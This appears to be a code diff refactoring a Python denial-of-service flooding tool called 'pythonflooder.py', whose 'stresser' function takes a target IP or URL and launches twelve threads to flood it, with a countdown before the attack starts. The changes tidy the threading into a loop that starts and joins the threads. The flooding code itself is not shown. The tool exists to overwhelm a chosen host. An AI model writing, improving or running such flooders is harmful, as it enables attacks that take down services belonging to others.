@@ -8,6 +8,7 @@ from sys import exit
 
 
 def stresser():
+    global host
     parser = optparse.OptionParser(usage="./pythonflooder.py --host IP / URL")
     parser.add_option("--host", help="target",
                       action="store", dest="host",
@@ -38,31 +39,16 @@ def stresser():
 
 def _threads_():
     try:
-        c = threading.Thread(target=stresser)
-        d = threading.Thread(target=stresser)
-        a = threading.Thread(target=stresser)
-        e = threading.Thread(target=stresser)
-        z = threading.Thread(target=stresser)
-        x = threading.Thread(target=stresser)
-        c1 = threading.Thread(target=stresser)
-        d1 = threading.Thread(target=stresser)
-        a1 = threading.Thread(target=stresser)
-        e1 = threading.Thread(target=stresser)
-        z1 = threading.Thread(target=stresser)
-        x1 = threading.Thread(target=stresser)
 
-        c.start()
-        d.start()
-        a.start()
-        e.start()
-        z.start()
-        x.start()
-        c1.start()
-        d1.start()
-        a1.start()
-        e1.start()
-        z1.start()
-        x1.start()
+        threads = [
+            threading.Thread(target=stresser)
+            for _ in range(12)
+        ]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+
     except KeyboardInterrupt:
         exit()
 
@@ -75,7 +61,7 @@ def start():
     print("========================")
     sleep(2)
     system("cls")
-    print("[*] Starting to flood in: 3")
+    print(f"[*] Starting to flood in: 3")
     sleep(1)
     system("cls")
     print("[*] Starting to flood in: 2")
